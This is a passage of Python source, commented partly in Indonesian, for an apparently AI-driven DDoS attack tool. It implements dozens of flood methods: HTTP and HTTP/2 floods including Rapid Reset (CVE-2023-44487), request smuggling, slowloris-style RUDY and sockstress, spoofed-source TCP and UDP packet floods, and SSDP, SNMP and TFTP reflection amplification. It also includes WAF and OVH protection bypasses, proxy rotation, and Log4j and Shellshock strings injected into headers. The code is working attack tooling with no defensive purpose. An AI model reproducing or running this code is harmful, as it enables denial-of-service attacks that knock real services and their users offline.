                # print(f"Slow Read Flood Error: {e}") # Debug
                # print(f"Slow Read Flood Error: {e}") # Debug
            finally:
                if s:
                    try: s.close()
                    except: pass

    def http_head_flood(self):
        """HTTP HEAD Flood"""
        with self._get_session() as s:
            while self.running:
                try:
                    self.new_dangerous_function()
                    proxy = self.get_proxy()
                    current_port = self.get_target_port("l7")
                    scheme = "https" if current_port == 443 else "http"
                    url = f"{scheme}://{self.target}:{current_port}/"
                    headers = self.get_rotated_headers()
                    headers['X-Forwarded-For'] = self.generate_smart_ip()
                    headers['Client-IP'] = self.generate_smart_ip()

                    start_t = time.time()
                    r = s.head(url, headers=headers, proxies=proxy, timeout=2)
                    lat = time.time() - start_t
                    self.stats["requests"] += 1
                    if self.dynamic_mode: break

                    # Feed data back to AI (Non-blocking analysis)
                    if random.random() < 0.1: # Sample 10% requests to save CPU
                        self.ai.analyze_response(url, r.status_code, dict(r.headers), 0, lat)
                except Exception as e:
                    self.global_learning_data["errors"]["http_head_flood"] += 1

    def cffi_bypass_flood(self):
        """HTTP Flood menggunakan curl-cffi untuk meniru fingerprint browser (WAF Bypass)"""
        if not CURL_CFFI_AVAILABLE:
            # Fallback ke HTTP GET biasa jika curl-cffi tidak ada
            # print(f"{Fore.YELLOW}[!] curl_cffi tidak tersedia, fallback ke http_get_flood.") # Debug
            # self.http_get_flood() # This will run in a separate thread, not here
            return

        # Moved async loop policy to global scope
        async def _async_worker():
            # Rotasi browser fingerprint untuk setiap sesi worker
            # Menggunakan daftar browser yang lebih luas untuk menghindari deteksi fingerprint statis
            browser_list = self.ai.get_browser_fingerprints()
            
            while self.running:
                try:
                    proxy_data = self.get_proxy()
                    proxies = {"http": proxy_data['http'], "https": proxy_data['https']} if proxy_data else None
                    
                    # Pilih identitas browser secara acak untuk sesi ini
                    browser_impersonate = random.choice(browser_list)
                    
                    # Reuse session per worker for efficiency
                    async with AsyncSession(impersonate=browser_impersonate, proxies=proxies, verify=False) as session:
                        # Lakukan beberapa request dalam satu sesi untuk meniru perilaku keep-alive
                        # Variasi batch size untuk menghindari pola tetap
                        for _ in range(random.randint(5, 50)): 
                            if not self.running: break
                            
                            path = self.get_smart_path()
                            current_port = self.get_target_port("l7")
                            scheme = "https" if current_port == 443 else "http"
                            url = f"{scheme}://{self.target}:{current_port}{path}"
                            
                            start_t = time.time()
                            r = None
                            
                            # Jitter: Penundaan acak mikro untuk meniru latensi manusia/jaringan
                            # Ini membantu menghindari deteksi rate-limiting berbasis pola waktu
                            if random.random() < 0.15:
                                await asyncio.sleep(random.uniform(0.1, 0.7))

                            # SMART ATTACK: Gunakan pola adaptif dari AI
                            pattern = self.ai.get_adaptive_pattern()
                            ai_payload = self.ai.generate_intelligent_payload(url, pattern)
                            
                            # Gabungkan header AI dengan header browser asli
                            req_headers = ai_payload.get("headers", {})
                            
                            if random.random() < 0.4: # POST
                                # Gunakan parameter AI sebagai JSON atau Form
                                r = await session.post(url, json=ai_payload.get("params", {}), headers=req_headers, timeout=5)
                            else: # GET
                                r = await session.get(url, params=ai_payload.get("params", {}), headers=req_headers, timeout=5)
                                
                            self.stats["requests"] += 1
                            lat = time.time() - start_t
                            if r: # Ensure r is not None
                                # Feedback Loop: Beritahu AI apakah pola ini berhasil
                                is_success = (r.status_code == 200)
                                self.ai.update_pattern_score(pattern, is_success)
                                if is_success:
                                    self.ai.register_success(ai_payload) # Simpan DNA payload sukses
                                
                                self.global_learning_data["response_times"].append(lat)
                                self.global_learning_data["status_codes"][r.status_code] += 1
                                self.ai.analyze_response(url, r.status_code, dict(r.headers), 0, lat)
                    if self.dynamic_mode: break # Break outer loop to re-evaluate
                except Exception:
                    await asyncio.sleep(0.1)
        
        # Jalankan worker async dalam thread saat ini
        asyncio.run(_async_worker())

    def http2_multiplex_flood(self):
        """HTTP/2 Multiplexing Flood - High Concurrency Streams"""
        if not CURL_CFFI_AVAILABLE:
            return

        async def _attack_session():
            while self.running:
                try:
                    proxy_data = self.get_proxy()
                    proxies = {"http": proxy_data['http'], "https": proxy_data['https']} if proxy_data else None
                    impersonate = random.choice(self.ai.get_browser_fingerprints())
                    
                    async with AsyncSession(impersonate=impersonate, proxies=proxies, verify=False) as s:
                        while self.running:
                            tasks = []
                            # Multiplexing: Kirim 100-200 request sekaligus dalam SATU koneksi TCP
                            # Increased batch size for higher aggression
                            for _ in range(random.randint(100, 200)):
                                if not self.running: break
                                current_port = self.get_target_port("l7")
                                scheme = "https" if current_port == 443 else "http"
                                url = f"{scheme}://{self.target}:{current_port}{self.get_smart_path()}"
                                tasks.append(s.get(url, timeout=5))
                            
                            if not tasks: break
                            responses = await asyncio.gather(*tasks, return_exceptions=True)
                            
                            for r in responses:
                                if isinstance(r, cffi_requests.Response):
                                    self.stats["requests"] += 1
                                    self.global_learning_data["response_times"].append(r.elapsed.total_seconds())
                                    self.global_learning_data["status_codes"][r.status_code] += 1
                                    self.ai.analyze_response(r.url, r.status_code, dict(r.headers), len(r.content), r.elapsed.total_seconds(), r.content)
                                else:
                                    # Handle exceptions (e.g., connection errors)
                                    self.global_learning_data["errors"]["http2_multiplex_flood"] += 1
                            if self.dynamic_mode: break
                except Exception:
                    self.global_learning_data["errors"]["http2_multiplex_flood"] += 1
                    await asyncio.sleep(0.1)

        async def _main_loop():
            # Run multiple concurrent sessions per thread to maximize throughput
            # This bypasses HTTP/2 stream limits per connection
            tasks = [asyncio.create_task(_attack_session()) for _ in range(3)]
            await asyncio.gather(*tasks)

        asyncio.run(_main_loop())

    def http2_rapid_reset(self):
        """HTTP/2 Rapid Reset (CVE-2023-44487) - High Stream Churn"""
        if not CURL_CFFI_AVAILABLE:
            return

        async def _reset_worker():
            while self.running:
                try:
                    proxy_data = self.get_proxy()
                    proxies = {"http": proxy_data['http'], "https": proxy_data['https']} if proxy_data else None
                    
                    # Use a modern browser fingerprint that supports HTTP/2
                    async with AsyncSession(impersonate=random.choice(["chrome120", "edge119", "safari17_0"]), proxies=proxies, verify=False) as s:
                        while self.running:
                            # Create a batch of requests
                            tasks = []
                            for _ in range(random.randint(50, 150)):
                                if not self.running: break
                                current_port = self.get_target_port("l7")
                                scheme = "https" if current_port == 443 else "http"
                                url = f"{scheme}://{self.target}:{current_port}{self.get_smart_path()}"
                                # Create task but don't await immediately
                                task = asyncio.create_task(s.get(url))
                                tasks.append(task)
                            
                            # Immediately cancel them to trigger RST_STREAM frames
                            for t in tasks:
                                t.cancel()
                                
                            self.stats["requests"] += len(tasks)
                            # Small delay to allow socket operations to flush
                            await asyncio.sleep(0.05) 
                            if self.dynamic_mode: break
                except Exception:
                    self.global_learning_data["errors"]["http2_rapid_reset"] += 1
                    await asyncio.sleep(0.5)

        # Run multiple workers for concurrency
        async def _main():
            await asyncio.gather(*[_reset_worker() for _ in range(5)])

        asyncio.run(_main())

    def smuggler_flood(self):
        """HTTP Request Smuggling Flood - Conflicting Headers"""
        while self.running:
            s = None
            try:
                self.new_dangerous_function()
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(4)
                
                target_ip = self.get_target_ip()
                port = self.get_target_port("l7")
                
                if port == 443:
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                    s.connect((target_ip, port))
                    s = ctx.wrap_socket(s, server_hostname=self.target)
                else:
                    s.connect((target_ip, port))
                
                path = self.get_smart_path()
                # Malformed headers (CL.TE or TE.CL)
                payload = (f"POST {path} HTTP/1.1\r\n"
                           f"Host: {self.target}\r\n"
                           f"User-Agent: {self.get_user_agent()}\r\n"
                           f"Content-Length: 4\r\n"
                           f"Transfer-Encoding: chunked\r\n"
                           f"\r\n"
                           f"5c\r\n"
                           f"GPOST / HTTP/1.1\r\n"
                           f"Content-Type: application/x-www-form-urlencoded\r\n"
                           f"Content-Length: 15\r\n"
                           f"\r\n"
                           f"x=1\r\n"
                           f"0\r\n\r\n").encode()
                
                s.send(payload)
                self.stats["requests"] += 1
                s.close()
                if self.dynamic_mode: break
            except:
                self.global_learning_data["errors"]["smuggler_flood"] += 1
                if s:
                    try: s.close()
                    except: pass

    def tcp_proxy_flood(self):
        """TCP Flood via Proxy (HTTP CONNECT) - Mendukung Port Acak"""
        while self.running:
            try:
                proxy_dict = self.get_proxy()
                if not proxy_dict or 'http' not in proxy_dict:
                    time.sleep(0.1)
                    continue
                
                proxy_url = proxy_dict['http']
                proxy_ip, proxy_port, user, password = self.parse_proxy(proxy_url)

                target_port = self.get_target_port("l4") # Use smart port selection
                
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(4)
                
                try:
                    s.connect((proxy_ip, int(proxy_port)))
                    auth_header = ""
                    if user and password:
                        cred = base64.b64encode(f"{user}:{password}".encode()).decode()
                        auth_header = f"Proxy-Authorization: Basic {cred}\r\n"
                    
                    connect_req = f"CONNECT {self.get_target_ip()}:{target_port} HTTP/1.1\r\nHost: {self.get_target_ip()}:{target_port}\r\n{auth_header}\r\n".encode()
                    s.send(connect_req)
                    response = s.recv(1024)
                    if b"200" in response:
                        for _ in range(50):
                           if not self.running: break
                           s.send(self.generate_payload(128, 1024))
                           self.stats["packets"] += 1
                finally:
                    s.close()
                if self.dynamic_mode: break
            except:
                self.global_learning_data["errors"]["tcp_proxy_flood"] += 1

    def layer8_browser_flow(self):
        """Layer 8 Attack - Simulates realistic user journey (Home -> Search -> Login -> Cart)"""
        with self._get_session() as s:
            while self.running:
                try:
                    self.new_dangerous_function()
                    proxy = self.get_proxy()
                    current_port = self.get_target_port("l7")
                    scheme = "https" if current_port == 443 else "http"
                    base_url = f"{scheme}://{self.target}:{current_port}"
                    
                    headers = self.get_rotated_headers()
                    
                    # Step 1: Homepage
                    s.get(f"{base_url}/", headers=headers, proxies=proxy, timeout=3)
                    
                    # Step 2: Search (Heavy DB)
                    query = "".join(random.choices(string.ascii_letters, k=random.randint(3, 8)))
                    s.get(f"{base_url}/search?q={query}", headers=headers, proxies=proxy, timeout=3)
                    
                    # Step 3: Login Page
                    s.get(f"{base_url}/login", headers=headers, proxies=proxy, timeout=3)
                    
                    # Step 4: Fake Login Post (Auth Logic Stress)
                    login_data = {
                        "username": self.generate_payload(5, 10).decode(errors='ignore'),
                        "password": self.generate_payload(8, 15).decode(errors='ignore')
                    }
                    s.post(f"{base_url}/login", headers=headers, data=login_data, proxies=proxy, timeout=3)
                    
                    self.stats["requests"] += 4
                    if self.dynamic_mode: break
                except:
                    self.global_learning_data["errors"]["layer8_browser_flow"] += 1

    def _get_session(self):
        """Helper untuk mendapatkan sesi requests (Perbaikan Bug)."""
        return requests.Session()

    def tcp_window_size_flood(self):
        """L4 TCP Window Exhaustion - Manipulates Window Size to stress stack"""
        if not SCAPY_AVAILABLE: return
        while self.running:
            try:
                self.new_dangerous_function()
                src_ip = self.generate_smart_ip()
                target_port = self.get_target_port("l4")
                # Randomize Window Size (0 to confuse, or very small/large)
                win_size = random.choice([0, 1, 65535, 32768])
                packet = IP(src=src_ip, dst=self.get_target_ip())/TCP(sport=random.randint(1024,65535), dport=target_port, flags="A", window=win_size)
                send(packet, verbose=0)
                self.stats["packets"] += 1
                if self.dynamic_mode: break
            except:
                self.global_learning_data["errors"]["tcp_window_size_flood"] += 1

    def dns_water_torture(self):
        """DNS Water Torture: Random Subdomain Flood to exhaust Recursive Resolvers"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        except: return
        
        while self.running:
            try:
                self.new_dangerous_function()
                # Generate random subdomain: x8z9.target.com
                sub = "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=random.randint(4, 12)))
                domain = f"{sub}.{self.target}"
                
                # Construct DNS Query Packet (A Record)
                # Transaction ID + Flags (Standard Query) + Questions(1) + Answer RRs(0) + ...
                header = os.urandom(2) + b'\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00'
                qname = b''.join(bytes([len(p)]) + p.encode() for p in domain.split('.')) + b'\x00'
                footer = b'\x00\x01\x00\x01' # Type A, Class IN
                
                # Send to target (assuming target is DNS server or we are flooding its resolver)
                target_port = 53 if 53 in self.target_ports else self.get_target_port("l4")
                s.sendto(header + qname + footer, (self.target, target_port))
                self.stats["packets"] += 1
                if self.dynamic_mode: break
            except:
                self.global_learning_data["errors"]["dns_water_torture"] += 1

    def graphql_flood(self):
        """GraphQL Introspection & Nested Query Flood (CPU Exhaustion)"""
        with self._get_session() as s:
            while self.running:
                try:
                    self.new_dangerous_function()
                    proxy = self.get_proxy()
                    # Coba tebak endpoint GraphQL umum
                    gql_paths = ["/graphql", "/api/graphql", "/v1/graphql", "/data"]
                    path = random.choice(gql_paths)
                    
                    current_port = self.get_target_port("l7")
                    scheme = "https" if current_port == 443 else "http"
                    url = f"{scheme}://{self.target}:{current_port}{path}"
                    
                    # Gunakan payload cerdas dari AI
                    payload = self.ai.generate_intelligent_payload(url, PIYOAIAnalyzer.AttackPattern.GRAPHQL_OVERLOAD)
                    
                    s.post(url, json=payload.get("params"), headers=self.get_rotated_headers(), proxies=proxy, timeout=5)
                    self.stats["requests"] += 1
                except: pass

    def nuclear_strike(self):
        """DEFCON 1: Synchronized Fission Wave Attack"""
        # Tunggu sinyal dari Panglima (AI Orchestrator)
        while self.running:
            if self.ai.defcon == PIYOAIAnalyzer.Defcon.NUCLEAR:
                self.nuclear_launch_code.wait(timeout=1)
                if self.nuclear_launch_code.is_set():
                    try:
                        # SERANGAN TERKOORDINASI: Kirim payload mematikan secara bersamaan
                        # Tidak ada delay, tidak ada mercy.
                        with self._get_session() as s:
                            nuke = self.ai.generate_nuclear_payload()
                            target = f"{'https' if self.port==443 else 'http'}://{self.target}:{self.port}/"
                            
                            if nuke["type"] == "xml":
                                s.post(target, data=nuke["data"], headers={"Content-Type": "application/xml"}, timeout=5)
                            elif nuke["type"] == "header":
                                s.get(target, headers=nuke["data"], timeout=5)
                            elif nuke["type"] == "json":
                                s.post(target, json=nuke["data"], timeout=5)
                            
                            self.stats["requests"] += 1
                    except:
                        pass
                    # Istirahat sejenak setelah ledakan untuk membiarkan server crash
                    time.sleep(0.5)
            else:
                time.sleep(1)

    def sockstress_flood(self):
        """Sockstress: TCP Zero Window Attack (Memory Exhaustion)"""
        while self.running:
            s = None
            try:
                self.new_dangerous_function()
                target_ip = self.get_target_ip()
                port = self.get_target_port("l4")
                
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(4)
                # Force receive buffer to minimum (1 byte) to advertise Zero/Small Window
                s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 1)
                
                s.connect((target_ip, port))
                self.stats["connections"] += 1
                
                # Send valid request to trigger response buffering on server side
                payload = f"GET / HTTP/1.1\r\nHost: {self.target}\r\n\r\n".encode()
                s.send(payload)
                
                # Hold connection indefinitely without reading
                while self.running:
                    time.sleep(10)
                    s.send(b'\x00') # Keep-alive
            except:
                self.global_learning_data["errors"]["sockstress_flood"] += 1
                if s:
                    try: s.close()
                    except: pass

    def quic_initial_flood(self):
        """L4/L7 QUIC Initial Packet Flood (UDP 443)"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        except: return
        
        while self.running:
            try:
                self.new_dangerous_function()
                target_ip = self.get_target_ip()
                # QUIC usually runs on 443, but we respect target port if it's UDP-like or random
                port = 443 if self.port in [80, 443] else self.get_target_port("l4")
                
                # Fake QUIC Long Header (Initial)
                # First byte: 11000000 (0xC0) + Version + DCID Len + SCID Len ...
                # This is a very rough approximation to trigger QUIC handshake processing
                header = b'\xc3' + os.urandom(1200) 
                
                s.sendto(header, (target_ip, port))
                self.stats["packets"] += 1
                if self.dynamic_mode: break
            except:
                self.global_learning_data["errors"]["quic_initial_flood"] += 1

    def xmlrpc_flood(self):
        """WordPress XML-RPC Flood (Amplification/Brute Force)"""
        with self._get_session() as s:
            while self.running:
                try:
                    self.new_dangerous_function()
                    proxy = self.get_proxy()
                    current_port = self.get_target_port("l7")
                    scheme = "https" if current_port == 443 else "http"
                    url = f"{scheme}://{self.target}:{current_port}/xmlrpc.php"
                    
                    headers = self.get_rotated_headers()
                    headers['Content-Type'] = 'text/xml'
                    
                    # Payload: system.listMethods (Heavy)
                    payload = "<?xml version='1.0'?><methodCall><methodName>system.listMethods</methodName><params></params></methodCall>"
                    
                    r = s.post(url, data=payload, headers=headers, proxies=proxy, timeout=5)
                    self.stats["requests"] += 1
                    
                    if random.random() < 0.1:
                        self.ai.analyze_response(url, r.status_code, dict(r.headers), len(r.content), r.elapsed.total_seconds(), r.content)
                    if self.dynamic_mode: break
                except:
                    self.global_learning_data["errors"]["xmlrpc_flood"] += 1

    def big_packet_flood(self):
        """L4 Big Packet Flood (MTU Saturation)"""
        if not SCAPY_AVAILABLE: return
        while self.running:
            try:
                self.new_dangerous_function()
                src_ip = self.generate_smart_ip()
                target_port = self.get_target_port("l4")
                # Maximize payload to near MTU (1400-1450 bytes)
                payload = self.generate_payload(1400, 1450) 
                
                # Randomize protocol (TCP/UDP)
                if random.random() > 0.5:
                    packet = IP(src=src_ip, dst=self.get_target_ip())/UDP(dport=target_port)/payload
                else:
                    packet = IP(src=src_ip, dst=self.get_target_ip())/TCP(sport=random.randint(1024,65535), dport=target_port, flags="PA")/payload
                
                send(packet, verbose=0)
                self.stats["packets"] += 1
                if self.dynamic_mode: break
            except:
                self.global_learning_data["errors"]["big_packet_flood"] += 1

    def ovh_bypass_flood(self):
        """OVH Bypass Flood (UDP Hex) - Designed to bypass OVH Game Protection"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        except: return
        
        while self.running:
            try:
                self.new_dangerous_function()
                target_ip = self.get_target_ip()
                port = self.get_target_port("l4")
                # Random hex payload 4-16 bytes (Common bypass technique)
                payload = os.urandom(random.randint(4, 16))
                s.sendto(payload, (target_ip, port))
                self.stats["packets"] += 1
                if self.dynamic_mode: break
            except:
                self.global_learning_data["errors"]["ovh_bypass_flood"] += 1

    def minecraft_pe_flood(self):
        """Minecraft PE RakNet Flood (Unconnected Ping)"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        except: return
        
        # RakNet Unconnected Ping Structure: ID (1) + Time (8) + Magic (16) + GUID (8)
        magic = b'\x00\xff\xff\x00\xfe\xfe\xfe\xfe\xfd\xfd\xfd\xfd\x12\x34\x56\x78'
        
        while self.running:
            try:
                self.new_dangerous_function()
                target_ip = self.get_target_ip()
                port = self.get_target_port("l4")
                
                payload = b'\x01' + struct.pack('>Q', int(time.time()*1000)) + magic + os.urandom(8)
                s.sendto(payload, (target_ip, port))
                self.stats["packets"] += 1
                if self.dynamic_mode: break
            except:
                self.global_learning_data["errors"]["minecraft_pe_flood"] += 1

    def connection_flood(self):
        """TCP Connection Flood (State Exhaustion)"""
        while self.running:
            try:
                self.new_dangerous_function()
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(4)
                target_ip = self.get_target_ip()
                port = self.get_target_port("l4")
                
                s.connect((target_ip, port))
                self.stats["connections"] += 1
                # Just hold the connection briefly then close to churn state table
                time.sleep(random.uniform(0.5, 2.0))
                s.close()
                if self.dynamic_mode: break
            except:
                self.global_learning_data["errors"]["connection_flood"] += 1

    def ssdp_amplification(self):
        """SSDP Amplification (UDP 1900) - High Amplification Factor"""
        if not SCAPY_AVAILABLE: return
        payload = b'M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nMAN: "ssdp:discover"\r\nMX: 2\r\nST: ssdp:all\r\n\r\n'
        while self.running:
            try:
                self.new_dangerous_function()
                reflector = self.generate_smart_ip()
                # Spoof Source = Target IP
                packet = IP(src=self.get_target_ip(), dst=reflector)/UDP(sport=1900, dport=1900)/payload
                send(packet, verbose=0)
                self.stats["packets"] += 1
                if self.dynamic_mode: break
            except:
                self.global_learning_data["errors"]["ssdp_amplification"] += 1

    def snmp_amplification(self):
        """SNMP Amplification (UDP 161) - Bulk Get Request"""
        if not SCAPY_AVAILABLE: return
        # SNMPv2c GetBulkRequest (public community)
        payload = b'\x30\x26\x02\x01\x01\x04\x06\x70\x75\x62\x6c\x69\x63\xa5\x19\x02\x04\x71\x3e\x0f\x80\x02\x01\x00\x02\x01\x00\x30\x0b\x30\x09\x06\x05\x2b\x06\x01\x02\x01\x01\x00'
        while self.running:
            try:
                self.new_dangerous_function()
                reflector = self.generate_smart_ip()
                packet = IP(src=self.get_target_ip(), dst=reflector)/UDP(sport=161, dport=161)/payload
                send(packet, verbose=0)
                self.stats["packets"] += 1
                if self.dynamic_mode: break
            except:
                self.global_learning_data["errors"]["snmp_amplification"] += 1

    def tftp_amplification(self):
        """TFTP Amplification (UDP 69) - Read Request"""
        if not SCAPY_AVAILABLE: return
        # Read Request for a common file (e.g., 'a')
        payload = b'\x00\x01\x61\x00\x6f\x63\x74\x65\x74\x00' # Opcode 1 (Read), Filename "a", Mode "octet"
        while self.running:
            try:
                self.new_dangerous_function()
                reflector = self.generate_smart_ip()
                packet = IP(src=self.get_target_ip(), dst=reflector)/UDP(sport=69, dport=69)/payload
                send(packet, verbose=0)
                self.stats["packets"] += 1
                if self.dynamic_mode: break
            except:
                self.global_learning_data["errors"]["tftp_amplification"] += 1

    def dns_query_flood(self):
        """DNS Query Flood (L7) - Exhausts DNS Server CPU with Random Subdomains"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        except: return
        
        while self.running:
            try:
                self.new_dangerous_function()
                sub = "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=random.randint(3, 10)))
                domain = f"{sub}.com"
                # Manual DNS Query Packet Construction (Standard Query, A Record)
                header = os.urandom(2) + b'\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00'
                qname = b''
                for part in domain.split('.'):
                    qname += bytes([len(part)]) + part.encode()
                qname += b'\x00'
                footer = b'\x00\x01\x00\x01' # Type A, Class IN
                
                payload = header + qname + footer
                # Kirim ke port 53 jika ada dalam target_ports, jika tidak gunakan default
                target_port = 53 if 53 in self.target_ports else self.get_target_port("l4")
                s.sendto(payload, (self.target, target_port))
                self.stats["packets"] += 1
                if self.dynamic_mode: break
            except:
                self.global_learning_data["errors"]["dns_query_flood"] += 1

    def zero_day_flood(self):
        """Simulates 0-Day Exploits (Log4j, Shellshock) to stress WAF/IDS"""
        with self._get_session() as s:
            payloads = [
                "${jndi:ldap://x.x.x.x/a}", # Log4j
                "() { :;}; /bin/bash -c 'sleep 5'", # Shellshock
                "../../../../etc/passwd", # Traversal
                "<script>alert(1)</script>" # XSS
            ]
            while self.running:
                try:
                    self.new_dangerous_function()
                    proxy = self.get_proxy()
                    current_port = self.get_target_port("l7")
                    scheme = "https" if current_port == 443 else "http"
                    url = f"{scheme}://{self.target}:{current_port}{self.get_smart_path()}"
                    
                    headers = self.get_rotated_headers()
                    # Inject into random headers to trigger WAF inspection
                    headers['User-Agent'] = random.choice(payloads)
                    headers['X-Api-Version'] = random.choice(payloads)
                    headers['Referer'] = random.choice(payloads)
                    
                    s.get(url, headers=headers, proxies=proxy, timeout=3)
                    self.stats["requests"] += 1
                    if self.dynamic_mode: break
                except:
                    self.global_learning_data["errors"]["zero_day_flood"] += 1

    def tcp_fin_flood(self):
        """TCP FIN Flood"""
        if not SCAPY_AVAILABLE:
            return
        while self.running:
            try:
                self.new_dangerous_function()
                src_ip = self.generate_smart_ip()
                target_port = self.get_target_port("l4") # Use smart port selection
                packet = IP(src=src_ip, dst=self.get_target_ip())/TCP(sport=random.randint(1024,65535), dport=target_port, flags="F")
                send(packet, verbose=0)
                self.stats["packets"] += 1
                if self.dynamic_mode: break
            except:
                self.global_learning_data["errors"]["tcp_fin_flood"] += 1
                # print(f"TCP FIN Flood Error: {e}") # Debug

    def tcp_rst_flood(self):
        """TCP RST Flood"""
        if not SCAPY_AVAILABLE:
            return
        while self.running:
            try:
                self.new_dangerous_function()
                src_ip = self.generate_smart_ip()
                target_port = self.get_target_port("l4") # Use smart port selection
                packet = IP(src=src_ip, dst=self.get_target_ip())/TCP(sport=random.randint(1024,65535), dport=target_port, flags="R")
                send(packet, verbose=0)
                self.stats["packets"] += 10
                if self.dynamic_mode: break
            except:
                self.global_learning_data["errors"]["tcp_rst_flood"] += 1
                # print(f"TCP RST Flood Error: {e}") # Debug

    def tcp_ack_flood(self):
        """TCP ACK Flood"""
        if not SCAPY_AVAILABLE:
            return
        while self.running:
            try:
                self.new_dangerous_function()
                src_ip = self.generate_smart_ip()
                target_port = self.get_target_port("l4") # Use smart port selection
                packet = IP(src=src_ip, dst=self.get_target_ip())/TCP(sport=random.randint(1024,65535), dport=target_port, flags="A")
                send(packet, verbose=0)
                self.stats["packets"] += 10
                if self.dynamic_mode: break
            except:
                self.global_learning_data["errors"]["tcp_ack_flood"] += 1
                # print(f"TCP ACK Flood Error: {e}") # Debug

    def tcp_xmas_flood(self):
        """TCP XMAS Flood (FIN+PSH+URG)"""
        if not SCAPY_AVAILABLE:
            return
        while self.running:
            try:
                self.new_dangerous_function()
                src_ip = self.generate_smart_ip()
                target_port = self.get_target_port("l4") # Use smart port selection
                packet = IP(src=src_ip, dst=self.get_target_ip())/TCP(sport=random.randint(1024,65535), dport=target_port, flags="FPU")
                send(packet, verbose=0)
                self.stats["packets"] += 10
                if self.dynamic_mode: break
            except:
                self.global_learning_data["errors"]["tcp_xmas_flood"] += 1
                # print(f"TCP XMAS Flood Error: {e}") # Debug

    def udp_random_flood(self):
        """UDP Random Port Flood"""
        if not SCAPY_AVAILABLE:
            return
        while self.running:
            try:
                self.new_dangerous_function()
                src_ip = self.generate_smart_ip() # Use smart IP generation
                packet = IP(src=src_ip, dst=self.get_target_ip())/UDP(dport=self.get_random_port())/self.generate_payload(64, 1024)
                send(packet, verbose=0, inter=0)
                self.stats["packets"] += 10
                if self.dynamic_mode: break
            except:
                self.global_learning_data["errors"]["udp_random_flood"] += 1
                # print(f"UDP Random Flood Error: {e}") # Debug

    def ssl_exhaustion_flood(self):
        """SSL/TLS Handshake Exhaustion"""
        while self.running:
            try:
                self.new_dangerous_function()
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(2)
                current_port = self.get_target_port("l7") # Use smart port selection
                s.connect((self.get_target_ip(), current_port))
                
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                
                ssl_sock = context.wrap_socket(s, server_hostname=self.target)
                ssl_sock.close()
                s.close()
                self.stats["requests"] += 1
                if self.dynamic_mode: break
            except Exception as e: # Catch specific exceptions for better debugging
                # print(f"SSL Exhaustion Flood Error: {e}") # Debug
                self.global_learning_data["errors"]["ssl_exhaustion_flood"] += 1
                pass

    def rudy_flood(self):
        """RUDY (R-U-Dead-Yet) Attack - Advanced Slow POST"""
        while self.running:
            s = None
            try:
                self.new_dangerous_function()
                current_port = self.get_target_port("l7") # Smart port selection
                proxy = random.choice(self.proxies) if self.proxies else None
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(15) # Timeout lebih panjang untuk koneksi awal
                
                if proxy:
                    try:
                        proxy_ip, proxy_port, user, password = self.parse_proxy(proxy)
                        s.connect((proxy_ip, int(proxy_port)))
                        auth_header = ""
                        if user and password:
                            cred = base64.b64encode(f"{user}:{password}".encode()).decode()
                            auth_header = f"Proxy-Authorization: Basic {cred}\r\n"
                        s.send(f"CONNECT {self.target}:{current_port} HTTP/1.1\r\nHost: {self.target}:{current_port}\r\n{auth_header}\r\n".encode())
                        if b"200" not in s.recv(1024):
                            s.close()
                            continue
                    except:
                        s.close()
                        continue
                else:
                    s.connect((self.get_target_ip(), current_port))
                
                # SSL Wrap if target is HTTPS
                # Random Content-Length yang sangat besar
                content_len = random.randint(10000, 100000)
                
                # Header yang lebih lengkap untuk terlihat seperti browser asli
                headers = [
                    f"POST /api/submit?{random.randint(0, 10000)} HTTP/1.1",
                    f"Host: {self.target}",
                    f"User-Agent: {self.get_user_agent()}",
                    "Connection: keep-alive",
                    f"Content-Length: {content_len}",
                    "Content-Type: application/x-www-form-urlencoded",
                    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                    f"Referer: https://{self.target}/",
                    "\r\n" # End of headers
                ]
                s.send("\r\n".join(headers).encode())
                
                # Kirim Body Byte-per-Byte dengan interval acak
                for _ in range(content_len):
                    if not self.running: break
                    # Kirim karakter acak
                    char = random.choice("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789")
                    s.send(char.encode())
                    # Sleep acak antara 1 hingga 10 detik (di bawah timeout server biasanya)
                    time.sleep(random.uniform(1, 10))
                
                s.close()
                self.stats["requests"] += 1
                if self.dynamic_mode: break
            except:
                self.global_learning_data["errors"]["rudy_flood"] += 1
                # print(f"RUDY Flood Error: {e}") # Debug
                if s:
                    try: s.close()
                    except: pass

    def udp_fragmentation_flood(self):
        """UDP Fragmentation Flood (IP Fragmentation)"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
            s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        except:
            return

        while self.running:
            try:
                self.new_dangerous_function()
                dest_ip = self.get_target_ip() # Rotasi IP Target
                daddr = socket.inet_aton(dest_ip)
                src_ip = self.generate_smart_ip()
                saddr = socket.inet_aton(src_ip)

                # IP Header dengan Flag More Fragments (MF=1) -> 0x2000
                payload = self.generate_payload(16, 64)
                total_len = 20 + 8 + len(payload)
                
                # 0x2000 = Flag MF set, memaksa target menunggu fragmen lain
                ip_header = struct.pack('!BBHHHBBH4s4s', (4 << 4) + 5, 0, total_len, random.randint(10000, 50000), 0x2000, 64, socket.IPPROTO_UDP, 0, saddr, daddr)
                
